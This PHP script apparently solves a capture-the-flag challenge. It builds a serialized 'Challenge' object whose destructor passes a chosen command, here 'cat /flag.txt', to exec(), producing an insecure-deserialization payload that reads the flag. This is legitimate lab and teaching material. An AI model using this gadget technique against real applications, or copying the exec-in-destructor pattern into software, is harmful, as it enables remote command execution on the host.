<?php

class Challenge{
  //WIP Not used yet.
  public $name;
  public $description;
  public $setup_cmd=NULL;
  // public $check_cmd=NULL;
  public $stop_cmd=NULL;

  function __construct($name, $description){
    $this->name = $name;
    $this->description = $description;
  }

  function start(){
    if(!is_null($this->setup_cmd)){
      $output=null;
      $retval=null;
      echo("Starting challenge!");
      exec($this->setup_cmd, $output, $retval);
      echo($output[0]);
    }
  }

  function stop(){
    if(!is_null($this->stop_cmd)){
      $output=null;
      $retval=null;
      echo("\n  Stoping challenge!");
      exec($this->stop_cmd, $output, $retval);
      echo($output[0]);
    }
  }


  function __destruct(){
    $this->stop();
  }

}

$chall = new Challenge("OneOfUs", "CatFlagger2000");
$chall->stop_cmd = "cat /flag.txt";

echo serialize($chall);

?>